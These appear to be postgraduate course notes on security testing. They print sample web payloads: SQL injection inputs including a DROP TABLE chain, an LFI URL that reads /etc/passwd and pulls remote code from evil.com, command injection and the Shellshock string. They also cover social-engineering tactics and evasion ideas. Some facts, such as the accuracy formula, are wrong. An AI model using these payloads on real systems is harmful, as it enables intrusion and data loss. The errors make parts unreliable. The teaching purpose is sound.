---
permalink: /course/postgraduate/sectest
title: Security Testing
---

{% include title_patch.html %}

{% include gen_index.html %}

{% include latex_support.html %}

# Web attacks

## SQL Injection
### Sinks (Where to Inject)

- GET/POST parameters: many client-side technologies communicate 
  with the server through GET/POST (e.g., AJAX, and also the now 
  deprecated Flash, Applet Java).
- every HTTP header: they must be treated as dangerous since it can be 
  very easily maliciously altered by a user and should not be trusted 
  (e.g., User-Agent, Referer).
- Cookies: after all, cookies are just HTTP headers, ... and they come from 
  the client => dangerous.
- Database itself: risk of 2nd order SQLi (explained later), if 
  the input of the application is stored in the database; 
  later, the same input may be fetched from the database and used 
  to build another query => dangerous 

### Target (What Can be Done by Injection)

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/sqlitarget.png"  alt=""/>
</div>

### SQLi: Tautologies

**Tautologies** are statements that are always true. 
They can be used as a tool for SQL injection. 
The most common uses include authentication bypass, 
and also showing all the records contained in a certain table. 

Comment for SQL:  
-- is a standard SQL comment.  
\# is a MYSQL comment.

There are several examples
```sql
#1 Input: "' OR '1'='1"
Note: If mysql_escape_string() is used, we could escape this by reverse slash "\"
like this \' OR \'\'=\'
#2 Input: "' OR 1=1 # "
#3 Input: "' OR user LIKE '%' #"
#4 Input: "' OR 1 #"
#5 Input: ' OR 'vulnerability'>'server'
Note: Bypass IDS by diverging from the more obvious tautologies
```

### SQLi: String SQLi vs. Numeric SQLi
If you are exploiting numeric SQLi, be aware of quote. There is no quote for numbers.

```sql
SELECT * 
FROM user_data
WHERE Login_Count = 1
AND userid = 1 OR 1 = 1
```

### SQLi: Union query

The UNION operator is used to combine the result-set of two or more SELECT statements.
- Each SELECT statement within UNION must have the same number of columns
- The columns must also have similar data types
- The columns in each SELECT statement must also be in the same order

It is important to note that:
- The **number** and **types** of the columns returned by the two SELECT must match.

As an exception, in the **MySQL** database if the types do not match, 
a cast is performed automatically.

We could use this to detect the total columns in this table.

```sql
Input: "' union SELECT 1,1,1,1--"
SELECT * FROM users where username='' union SELECT 1,1,1,1--'
Note: if the table has 4 columns here it would be no error otherwise it could throws exception.
```

### SQLi: 2nd Order Injection

2nd Order Injection occurs when malicious input value is saved in the database, 
and after that a new query is composed with the malicious value saved 
in the database. 

```sql
First Input: username="admin'--"
UPDATE users SET pass='new password' WHERE user='admin'--'
```

### SQLi: Piggy-backed/Chained

Multiple commands are executed.

As a warning, SQLi piggy-backing/chaining may not work depending on 
the method/function invoked to perform the query.

```sql
Input: "'; DROP TABLE users −− "
SELECT id FROM users 
WHERE user=''; 
DROP TABLE users -- ' AND pass=''
```

### MYSQLi: Information Schema

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/infoschema.png"  alt=""/>
</div>

See more at https://websec.ca/kb/sql_injection

### SQLi: Blind SQLi

Blind SQL injection is a type of SQL injection attack that asks 
the database true or false questions and determines the answer 
based on the applications response.

- This attack is often used when the web application is configured to 
  show generic error messages, but has not mitigated the code 
  that is vulnerable to SQL injection.
- Most of the time you start by finding which type of database is used, 
  based on the type of database you can find the system tables 
  of the database you can enumerate all the tables present in the database.
  - With this information you can start getting information from 
    all the tables and you are able to dump the database.
- In general, Blind SQLi is much harder to exploit successfully than 
  traditional SQLi

**Common Expression Used in Exploitation**
- **IF(expression, expr_true, expr_false)**
- **SUBSTRING**:
  - SUBSTRING(str, pos)
  - SUBSTRING(str, FROM_pos)
  - SUBSTRING(str, pos, len)
  - SUBSTRING(str, FROM_pos, FOR_len)

It is also common to see this using time-based techniques.
- **BENCHMARK(loop_count, expression)** (mysql):  
  We could compare the time which server used to executing the command. If 
  the BENCHMARK command is executed, it slows down the speed that server process
  it. **IF YOUR NETWORK ISN'T STABLE, THE RESULT MIGHT WRONG.**

### MYSQLi: File Based Technique
MySQL offers some functionalities for reading and writing file results.

Be aware of:
- File operation fail if "FILE" permission is not granted
- load_file returns NULL upon failure
- "Into outfield" triggers a MySQL ERROR

```sql
SELECT LOAD FILE('<file path>')
SELECT <query> INTO OUTFILE '<file path>'
```

### SQLi: Countermeasures

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/sqlicounter.png"  alt=""/>
</div>

## Client Side Attacks
### XSS
#### Reflected XSS

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/xss.001.jpeg"  alt=""/>
</div>

#### Stored XSS

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/xss.002.jpeg"  alt=""/>
</div>

#### DOM-based XSS

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/xss.003.jpeg"  alt=""/>
</div>

### CSRF

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/csrf.png"  alt=""/>
</div>

1. The bad guy sends a page to the victim user.
2. The victim opens the page in his browser, thus triggering an HTTP GET request 
   to the malicious website.
3. The website returns an HTTP 200 response, with an HTML page and a form. 
   The "action" tag of the form is however an external website.
4. When the user submits the form, he sends the information to 
   the vulnerable Web server, triggering a "fake voting service".

### Countermeasures

#### Client-side
- Reflected XSS: if the attack is shown in the URL, accessing directly 
  the domain root (without clicking on the full URL) would prevent 
  Reflected XSS (but not Stored XSS).
- NoScript Firefox/Chrome extension (and similar extensions for 
  other browsers) - **disables JavaScript by default**
- Do not visit other websites while logged onto other (sensitive) services.
#### Server-side
- **Input validation**: Input should always be considered untrusted and 
  should be always sanitized (e.g., htmlspecialchars())
- Against CSRF:
  - CAPTCHA/PIN to specify in every sensitive action/request/transaction
  - **CSRF tokens**: hidden parameters with unpredictable values passed 
    by the application (most used/effective option)

#### CSRF Token

1. The user browser sends an HTTP GET request to a Web server page.
2. The Web server sends the page, and embeds a randomly generated "CSRF token" in it. 
   The CSRF token is unique for this HTTP response, and any other user request 
   would generate a new CSRF token.
3. The user browser sends a post request, attaching the cookie information and 
   the CSRF token.

In this way, the Web server has an authentication mechanism to know that 
the user is actually performing an operation from a Web page generated by the Web server.

- A unique value is sent in HTTP responses by a Web server
- Every client request is checked by the Web server to have this unique, 
  valid CSRF token

## Bypass Client-Side Controls
These could be bypass using dev tools or interpreter
### Hidden Form Fields
```html
<input type="hidden" name="price" value="449">
```
It would be shown in HTTP request
```http request
price=449
```

### Length Limits
```html
<input type="text" name="quantity" maxlength="1">
```

### Disable Elements
```html
<input type="text" name="price" disabled="true" value="449">
```

### Script based Validation
```html
<form method="post" action="submit" onsubmit="return validateForm(this)">
</form>
<script>
    function validateForm(Form) {
        ...
    }
</script>
```

## Local/Remote File Inclusion
```php
<?php
include $_GET['lang'];
?>
```

```url
http://site.com/test?lang=/etc/passwd

http://site.com/test?lang=http://evil.com/code.txt (causing RCE)
```

### countermeasure
```url
php://filter

php://filter/read=a|b/resource=f (applies filters a and b while reading f)
php://filter/write=a|b/resource=f
php://filter/a|b/resource=f (read and write)
```

## Command Injection
```php
<?php
$host = $_GET['host'];
system('ping -c 4 ' . $host);
?>

http://site.com/ping.php?host=a;cat%20/etc/passwd
```

### Shellshock
- Also known as BashDoor
- It is a Bash (versions<=4.3) vulnerability, widely present in Linux systems
- Discovered in 2014, but originally introduced in Bash in 1989
- Used for command execution from environment variables unintentionally

character sequence: `() { :;};`
```shell
$ env x='() { :;}; echo vulnerable' bash -c "echo not-vulnerable"
```

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/shellshock.png"  alt=""/>
</div>

## Race Condition in Web Apps

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/concurrency.png"  alt=""/>
</div>

- Unexpected parallelism can lead to unforeseen interactions
- Parallelism can be controlled client-side
- synchronization primitives are seldom used, and their efficacy is often system-dependent

# Network Reconnaissance
## Network Security Assessment
1. **Reconnaissance** to identify networks, hosts, and users of interest
2. **Vulnerability scanning** to identify potentially exploitable conditions
3. **Investigation of vulnerabilities** and further probing by hand
4. **Exploitation of vulnerabilities** and circumvention of security mechanisms

### Phase 1: Reconnaissance
Reconnaissance explores the tactics to identify hosts, networks, 
and users of interest, and it can be either passive or active.

- **Passive**: Open Source Intelligence (OSINT)
  - e.g., web search engines, WHOIS databases, DNS servers
- **Active**: Scanning target network
  - Network map reconstruction
  - Host enumeration
  - Port enumeration


### Phase 2: Vulnerability Scanning

Vulnerability scanning is usually supported by tools, 
and it may be useful to expose vulnerable or unpatched services running 
in a target network. Some of the most popular vulnerability scanning tools include:

- nmap (which we will analyze in-depth later in this topic)
- Nessus
- Rapid7 Nexpose
- QualysGuard

In general, scanning is also useful for:
- Service enumeration (to identify vulnerable versions of services)
- Insights into firewall Access Control Lists (ACLs)

### Phase 3: Investigation of Vulnerabilities

Vulnerabilities are found by "researchers". They can then either be 
**responsibly** disclosed to the product vendor (so they can patch it), 
or **irresponsibly** to customers willing to pay for new vulnerabilities 
(huge black market for zero-days).

The following diagram depicts an overview of how a vulnerability 
can pass from the private domain to the public, either 
via **responsible disclosure** or **weaponization**.

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/investigation.png"  alt=""/>
</div>

### Phase 4: Exploitation of Vulnerabilities

There is a plethora of tools to support also the exploitation of vulnerabilities, 
as we will see later in the course. Some tools include Rapid7 Metasploit, 
CORE Impact, Immunity CANVAS. An important remark to make is that, 
as we have seen in other steps of the security testing pipeline, 
humans cannot be replaced by tools. Also here, tools can only 
successfully exploit the easiest types of vulnerabilities, but it may require 
some scripting and exploit writing to identify and exploit real vulnerabilities 
in more complex systems.

### Iterative Process
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/iterative.png"  alt=""/>
</div>

## Passive Reconnaissance
### Querying Search Engines and Websites
The following classes of data are often uncovered by querying search engines 
and websites:

- Physical addresses of office locations
- Contact details, including email addresses and telephone numbers
- Details of internal email systems and routing
- DNS layout and naming conventions
- Files residing on publicly accessible servers

#### Google Search
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/google.png"  alt=""/>
</div>

#### Querying Netcraft
The Netcraft Web Application contains historical server fingerprints, 
which you can use to check OS versions or map network blocks of a company.

#### Shodan
Shodan is a service that collects network scan data results. 
You may identify exposed and/or unhardened services. 
The Metasploit tool also relies on shoran, optionally.

#### LinkedIn
Even if it may seem just as a social network, in practice LinkedIn - 
and especially LinkedIn Premium may be useful to look for people and roles 
without notifying them.

#### Domain WHOIS
The WHOIS query and response protocol contains useful public information 
about domain registrars (although sometimes this can be anonymized). 
Typically, it contains:

- Administrative contact details (names, email addresses, and telephone numbers)
- Mailing addresses for office locations relating to the target organization
- Details of authoritative name servers for each domain

#### Automated Email Enumeration
The TheHarvester tool supports automatic search and collection of email/hosts 
on public search engines.

#### DNS Querying
By querying name servers, you may find information about 
registered name servers and some exposed services.

### Countermeasures
- **Disable directory indexing** on Web servers
- Use “**robots.txt**” to prevent indexing of certain content by search engines
  - but do NOT rely on it to protect sensitive data
- Use **generic details in WHOIS data** (or privacy-protect it)
- **Disable DNS zone transfers to untrusted hosts**
- **Prune DNS zone files from unnecessary information**
- **Preventing TypoSquatting**: you may check if a similar domain is available.
  - e.g., google and goog1e

## Active Reconnaissance
### nmap
nmap enables 10+ types of scanning methods
- Some scanning methods may be blocked
- Doing an intersection fo different scanning strategies allows you to
  gather more information
  
### Host Scanning
The presence of an IP within a domain zone does not necessarily imply
that the IP is reachable through Internet.  
You need to verify, for each potential “target” system:
- If it is active (or not)
- If it is reachable (or not)

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/hostscan.png"  alt=""/>
</div>

One of the first step in reconstructing a map of the target network is
the automated execution of a series of ping commands on intervals of IP
addresses and network blocks, to determine which systems are active  
Known Techniques:
- Ping sweep
- ICMP sweep

Limitation: Normally the “ping” command is used to send packets ICMP
ECHO_REQUEST to a system, soliciting the return of a segment ICMP
ECHO_REPLY, which indicates that the system is functioning

#### fping
```shell
fping -s -g 192.168.10.0/24
```

- option `-s`: print cumulative statistics upon exit
- option `-g`: generate a target list from a supplied IP netmask

#### nmap
Unlike fping, the option -sP of nmap allows you to send in parallel:
- An ICMP ECHO_REQUEST packet
- A TCP ACK (to port 80)
  - In this way, also “hosts” blocking ICMP packets can be detected

#### Defense
Defense:
- Block all ICMP traffic
  
Counter-defense:
- scan ports at the transfer layer (TCP/UDP):
  - e.g., through nmap or hping3
  
### Port Scanning
Trying to connect to TCP and UDP ports of the target system to
determine which network services are in execution (or LISTENING)  
Knowing active ports offers important knowledge that can be
exploited to attack a system
- Well-known ports are typically associated with known services
- e.g., Web Server on ports 80, 8080, and 443

#### UDP Portscan
- A zero-length UDP packet is sent to each port
- If an ICMP error "port unreachable" is received the service is assumed unavailable

#### TCP Portscan
- Most services are statically associated with port numbers (/etc/services in \*NIX)

**TCP SYN Scanning**
- aka "half-open" scanning
- If an SYN/ACK packet is answered, the port is open
- If RST packet is answered, the port is closed
- Then attacker send RST packet to avoid open the connection

**TCP FIN Scanning**
- RST packet is sent back if port is closed
- Ignored if port is open
- Windows always send RST back

**Idle Scanning**
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/idlescanning.png"  alt=""/>
</div>

### OS Fingerprinting
```shell
nmap -O ip_address
```
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/osfingerprinting.png"  alt=""/>
</div>

### Service Enumeration
By grabbing the headers of exposed services, nmap (option -sV) can try
to infer the exact service version
- First step before looking for vulnerabilities (e.g., on public repos)

#### nmap
```shell
nmap -sV ip_address
```

### Contermeasures 
- Block scanning (e.g., ICMP)
- Check open ports and configuration, to make sure that only appropriate services 
  are exposed.
- Monitor network activity (e.g., Intrusion Detection System, SIEM)

# Reporting
## Security Testing Activities
### Vulnerability Assessment (VA)
- **Execute tools to identify vulnerabilities in systems and software**
- Use both open-source and paid tools
  - For this class, we will use open-source ones, but when doing a
    professional VA it is not realistic to assume that the attacker does not
    have access to licensed tools. 
- Unlike Pentesting, VA usually involves only “using tools as is”

### Penetration Testing
It is a more sophisticated activity that goes beyond the tools:
- **you simulate behavior and capabilities of a real attacker** to try to
  “penetrate” into a computer system.
- It comprises several phases and has also some recommended
  standards, such as Penetration Testing Execution Standard (PTES)

Phases of Pentesting:
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting

### Red Teaming
- Red Team = attackers, Blue Team = defenders
- Red Team emulates Tactics, Techniques and Procedures (TTPs) of
adversaries
- Blue Team is typically **not informed** that a Red Team has been hired
(whereas in penetration testing, they collaborate).
- Red Teaming is often confused with Penetration Testing, and they are
often used interchangeably

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/pentestvsredteam.png"  alt=""/>
</div>

## Reporting
### Objectives
- Report the findings
- Rate the vulnerabilities
- Explain how the results will affect the customer in the real world

### Quality
Anyone can:
- run a vulnerability scanner
- report results in a template by changing organization name at the top.

Not everyone can understand what vulnerabilities actually mean.
- Your added value comes here. 

To make client
- Understand report
- Reproduce exploitations
- Implement remediations

### Vulnerability Details
- Estimated **risk and impact values** consistent with the context 
  (e.g., low-medium-high)
  - For example, httpOnly flags disabled in an application that does not
    have a login is very low risk and impact.
  - Whereas not having httpOnly flags enabled if there is a reflected XSS
    vulnerability then it is high risk and high impact.
- **Category** (e.g., Data Exposure)
- **Location** (where is it)
- **Description** of the vulnerability
- **Replication steps** (how your client can replicate the vulnerability)
- **Recommendation** on how to remediate it

### Common Mistakes
- Don’t RE-TITLE a tool report (e.g., Nessus)
- Rate your vulnerabilities appropriately
  - Find a consistent and clear way to do so (e.g., Appendix)
  - Refer to the CIA security triangle
- Separate Theoretical vs. Real Findings
  - e.g., whether an exploit is practical/available
- Make sure vulnerabilities are actual vulnerabilities
  - e.g., PHP cgi vulnerabilities on an Apache server that is not running them
- Write clear reproducibility steps
- Remediations and Solutions are just as important as the Findings
- Standardize all your templates

# Social Engineering
- Many attackers claimed that the easiest way to get the information you
want, is by asking to the victims themselves.
  - Psychological techniques to get private information
  - Does not require a computer science background
  - Attack vectors: spear phishing, phone calls with impersonation, ...

#### Definition
Social Engineering is a psychological manipulation of people into
revealing confidential/sensitive information of the organization or
performing certain actions, such as:
- open an infected attachment via e-mail
- click on a URL of a compromised website.

Social Engineering relies on a set of non-technical strategies that exploit
weaknesses of human psychology.
  - Hence, it typically does not require a computer science background, but
    rather a knowledge of the potential victim and their personal context
    
## Phases
- Phase 1: **Reconnaissance**: The attacker learns as much as possible (e.g.,
  through Open Source Intelligence) to result credible and lure the victims into
  revealing sensitive information of perform dangerous actions.
  - Roles in the company
  - Company contacts (e.g., e-mail, phone numbers)
  - Key persons in the company
  - Choosing a victim
- Phase 2: **Victim Approach**: The actual attack of the social engineer is
  performed by contacting the victim through one of the possible attack
  vectors, such as:
  - Phone
  - Email
  - Social network 

## Key Principles
- Principle 1: **Reciprocity**
  - People tend to return a favor.
  - If the attacker is for example generous or does something for the
    victim, he/she will feel more compelled to do a favor also to the
    attacker
  - For example,
    - bending the rules,
    - provide special access without passing by the protocol

- Principle 2: **Commitment and Consistency**
  - If people commit to an idea or goal, they are more likely to honor that
    commitment because they have stated that that idea or goal fits their
    self-image.
  - The attacker may find and exploit victim’s commitments
  - For example,
    - Particular charity activities
    - Recycling
    - Eating particular types of foods

- Principle 3: **Social Proof/Consensus**
  - People will do things that they see other people are doing.
  - For example:
    - Attackers may create fake websites with testimonials and lure the victim
      into clicking something.
    - Or maybe convince the victim that another employee has already done
      that, or that it is not the first time a similar request has been made.

- Principle 4: **Authority/Intimidation**
  - People will tend to obey authority figures, even if they are asked to
    perform objectionable acts.
  - The attacker can try to impersonate someone important in the
    organization, which the victim may not know personally.

- Principle 5: **Liking/Familiarity**
  - People are easily persuaded by other people whom they like.
  - The attacker may:
    - call the other person by first name
    - throw in the conversation/e-mail a topic that is liked by the victim
      (e.g., a football match, hobbies).
      
- Principle 6: **Scarcity/Urgency**
  - Perceived scarcity will generate demand, and this may be used to
    induce urgency in the victim.
  - For example,
    - take advantage of limited-time opportunities (e.g., to lure the victim
      into clicking a link, or providing information).
    - a false request of urgency for updating a presentation for the person’s
      boss who did not have time do to it and has an important
      presentation in a few hours (e.g., maybe attaching an infected
      presentation to an e-mail request).
      
## Reconnaissance
- OSINT reconnaissance
- example: Email Harvesting
  - It is an effective way of finding emails, and possibly usernames,
    belonging to an organization.
  - These emails are useful in many ways, such as providing intelligence
    on how to perform attacks, revealing the naming convention used in the
    organization, or mapping out users in the organization. 

- Typically, not senior members of the company, but people who are
closely tied to them (e.g., secretaries, collaborators)
- Once a candidate victim is chosen, you need to spot the list of elements
that will create a confidential “feeling” between you and the victim
  - Exact victim’s position in the company
  - Use of nicknames known only in the company
  - Praising the role of the victim (e.g., knowing what they do)
  - Belonging to some mailing list
  - Personal interests of the victim
  
## Victim Approach
### Attack Vectors
- **Vishing** (voice call)
  - Perform a voice phone call to lure the victim into revealing sensitive
    information or performing attacker-desired actions.
  - Common strategies:
    - Impersonating a manager/senior member of the organization
    - pretending to be a colleague in need

- **Spear Phishing** (e-mail)
  - Send a targeted e-mail to the victim, to lure him/her into clicking a link,
    opening an attachment, or revealing some sensitive information.
  - Unlike traditional phishing, this is crafted for a specific victim.

- **Tailgaiting**:
  - Entering in restricted areas by following people with access
  - Pretending to be someone with access (e.g., courier)

- **Smishing** (SMS Phishing):
  - Similarly to phishing, but performed by sending an SMS text message.
  - Depending on the victim habits, the attack vector should resemble the
    most trusted communication method for the attacker.

- **Watering Hole**:
  - Compromising part of a legitimate website (e.g., through stored XSS, or
    DNS poisoning) trusted by the victim (e.g., the victim’s bank website).
  - When the victim visits the websites, some malicious code is executed only for that
    specific target (i.e., it is not triggered for all the other benign users).

- **Quid Pro Quo**:
  - The attacker offers “something in exchange” for following his orders
  - Examples:
    - The attacker calls various numbers pretending to be a technician,
      and convinces a victim to follow commands to grant him access or
      which lead to malware installation
    - Occasionally, the attacker may have pre-installed some preliminary
      malware that slows down the PC (e.g., computer virus hoaxes)
    - Offers salary reconciliation
  
## Countermeasures
- How to Spot a Social Engineer
  - Hurry
  - Intimidatory attitude
  - Refuses sharing contact information (e.g., phone battery is dying)
  - Too friendly for being a stranger
  - Interest in private information
  - Small mistakes
  - Knows only subsets of names but not many manager’s names
  
- Be Skeptical and Aware of Risks
  - Emails with urgent requests of sensitive information or delicate actions
  - Typosquatting e-mail addresses
  
# Password Cracking
## Dictionary Attacks
A password of at least 8-12 characters could guarantee a good
protection level against brute-force attacks.  
Unfortunately, there are other options:
- Knowledge of personal data
- Use of dictionary attacks for the research of:
  - words, fragments of meaningful words, ...
  - Names lists, locations, dates, companies, ...

There are four main elements to initially determine security of a password:
1. **Number of symbols** used in the password (e.g., a 4-digit locker would
   require on average 5000*2 seconds, i.e., about 3 hours)
2. **Number of possibilities** for each position (e.g., an alphabetic lock with
   three symbols would require 26*26*26 possibilities, i.e., an average of 5
   hours instead of 17 minutes).
3. **Time required by every attempt** (e.g., if 20s were required instead of 2s
   for every attempt, the situation would be much different, but so it would
   be if there would be only 2 msec for every attempt)
4. Are there easier **alternatives**? Typically, an attacker does not want to
   leave evidences/traces, but he may be forced to break the bag
   
## Hash Function
Cryptographic Hash Functions (CHFs) are hash functions suitable for 
information security applications, and have the following ideal properties:
- **Deterministic**: given message M, its hash H(M) is always the same
- **Quick to compute**
- **Infeasible to generate message M that has a specific hash value H**
- Infeasible to find messages M1 and M2 such that H(M1)=H(M2)
- **Avalanche Effect**: A small change in message M, which makes it M’,
  should change the hash value extensively
  
### Birthday Problem
Given an i.i.d. distribution of people, with 23 people, probability that 
a pair has the same birthday already at 50%
- **Pigeonhole principle**:
  - Reaches 100% probability when 367 people are present 
    (since there are only 366 possible birthdays)

- **Birthday Attack**: The attack depends on the higher likelihood of
collisions found between random attack attempts and a fixed degree
of permutations (pigeonholes).
  
### Collision Attack
Finding two inputs that generate the same hash

MD5 is a cryptographic hash function
- Produces 128-bit hash value
- Known to be vulnerable to collisions
  - Collisions can be found in seconds in an ordinary computer
  
### Pre-Image Attack
Tries to find a message that has a specific hash value
- Example: Violate message integrity
- In general, impossible to detect or prove integrity violation

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/preimage.png"  alt=""/>
</div>

## Password Cracking
### Brute-Force
Trying all possible passphrase combinations by enumeration until you get
the right one (e.g., you get a meaningful plaintext, you access the system)

**Mitigations**:
- Increase attempt-time, symbols, possibilities for each symbol
  
### Dictionary Attack
A variant of brute-force attack for password cracking
or cryptanalysis in which, instead of trying all the possible password
alternatives, you try only a set of passwords from a dictionary

Examples of dictionaries:
- List of real words in any language
- Combinations of words
- Common passwords from public lists

#### Pre-Computing Dictionary
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/precompute.png"  alt=""/>
</div>

### Rainbow Table Attack
Pre-Computed Dictionary Attacks: You could precompute a list of hashes of
dictionary words, and storing these in a table, so that you always know the
conversion.
- If “hash-chain” functions are used to store the pre-computed hashes, then the
  table is called rainbow table.

Space-time Trade-off: Rainbow tables reduce storage requirements at the cost of
  slightly longer lookup-times.

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/rainbow.png"  alt=""/>
</div>

Objective: Find plaintext password  
Conditions: Rainbow Table has 3 reduction functions  
**Step 0**: I find the hash "re3xes" in /etc/shadow of the victim.  
**Step 1**: Try Function R3, if not found, try Function R2 then R3, or R1, R2, R3 
until find a keyword at the last of one of the chain (here linux23).  
**Step 2**: Start at the first keyword of the chain, calculate until find the "re3xes" 
(here passwd -H-> dlcm4 -R1-> culture -H-> re3xes), therefore **culture** is the plaintext

#### Countermeasures: Rainbow Table Attacks / Pre-Computed Dictionary
Attacks can be thwarted by the use of salt
- Salt is a technique that forces the hash dictionary to be recomputed for
  each password sought, making pre-computation infeasible, provided
  the number of possible salt values is large enough.

Common mistakes:
- short salts
- reuse salts

Note that using “salt” does not provide robustness to Dictionary Attacks,
but only to pre-computation

## Weak Passwords
- Default Passwords (provided by system vendor)
- Dictionary Words
- Words with numbers appended (password1)
- Words with simple obfuscation (p@ssw0rd)
- Doubled Words (passpass)
- Common sequences from keyboard row (qwert)
- Numeric sequences based on well known numbers (911)
- Identifiers (Names)
- Weak passwords in non-English languages
- Anything personally related to an individual

# Exploitation
## Finding Exploits
#### Find
• Reliable sources (checked closely)
- SecurityFocus
- ExploitDatabase

Always try to understand exploit code before running them

#### Customize
Exploits mostly do not work out of the box
- Bad code
- Wrong offsets
- Wrong return addresses for more recent OS or patch levels
- etc.

Heterogeneous languages

## Popular Vulnerabilities
### Heartbleed
See at [SSL/TLS Vulnerabilities](/security/ssl/#heartbleed)

### Dirty COW (Copy-on-Write)
Vulnerability of Linux kernel (also works for Android <= 7)  
Local privilege escalation vulnerability that exploits a **race condition**
in the implementation of the **copy-on-write mechanism** in the kernel's
memory-management subsystem
- A read-only file can become writable
- Used in conjunction with other exploits, it allows remote root access
- Fix: use a copy-on-write flag

### PHPMailer RCE
Remote code execution (RCE) vulnerability for the PHP e-mail library
- Cause: class.phpmailer.php incorrectly processing user requests

Four main steps:
1. PHPMailer gets user requests
2. PHPMailer validates user-supplied data
3. PHPMailer sends the data to the PHP mail() function
4. PHPMailer then calls the OS command “sendmail” (e.g., in Linux) to
   actually send the e-mail (of course a mail server needs to be
   configured on the machine to send a message), using
   `/usr/bin/sendmail -i -t -f <sender>` as default

```
"attacker \" -injPar1 -injPar2"@example.com
```

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/phparg.png"  alt=""/>
</div>

### ImageTragick
ImageMagick is an image processing library often used on the Web  
Multiple vulnerabilities:
1. CVE-2016-3714 - Insufficient shell characters filtering leads to
   (potentially remote) code execution
2. CVE-2016-3718 - SSRF
3. CVE-2016-3715 - File deletion
4. CVE-2016-3716 - File moving
5. CVE-2016-3717 - Local file read

## Metasploit
- **Exploit**: The means by which an attacker (or penetration tester) takes
advantage of a flaw within a system (e.g., SQL injection, buffer overflow)
- **Payload**: The code that the attacker wants to be return after successful
exploits on target system (e.g., reverse shell, bind shell)
- **Shellcode**: Set of instructions used as payload when the exploitation
occurs. Typically, written in assembly.
- **Module**: Piece of software that can be used by metasploit
  - Exploit module: to conduct attack
  - Auxiliary module: to support an attack (e.g., scanning)
  - Post exploitation module
- **Listener**: Metasploit component that waits connection of sorts (e.g., after
  target has been exploited)
  
# Advanced Strategies
## Stealth
- Before weaponization & delivery, check AV/Filters detection
  - Encoding (e.g., msfencode)
  - Transient malware (e.g., in-memory malware)
  - Mimicry (e.g., launch payload while executing other legitimate apps)
  - Packers: obfuscate malicious code, and unpack routine at runtime
  
## Presistence
- Payload in Metasploit (e.g., meterpreter)
- Scheduled Tasks (consider users rebooting system)
- Backdoors

## Adversarial Machine Learning
### 5 Phases
1. Data Collection
2. Pre-processing and Feature Engineering
3. Model Selection and Training
4. Testing and Evaluation
5. Evaluation against Time Evolution and Adversaries

### Algorithm Categories
- Classification: given a labeled dataset, find a model that 
  separates instances into classes
  
- Regression: given some points, try to generalize and predict real-valued numbers
- Clustering: given an unlabeled dataset, try to group similar elements

### Evaluation
$TP$: True Positives  
$FP$: False Positives  
$TN$: True Negatives  
$FN$: False Negatives

Precision: How many selected items are relevant

$Precision = \frac{TP}{TP + FP}$

Recall: How many relevant items are selected

$Recall = \frac{TP}{TP + FN}$

F1-Score:

$F_1Score = 2 * \frac{Precision * Recall}{Precision + Recall}$

Accuracy:

$Accuracy = \frac{TP + FN}{TP + FP + TN + FN}$

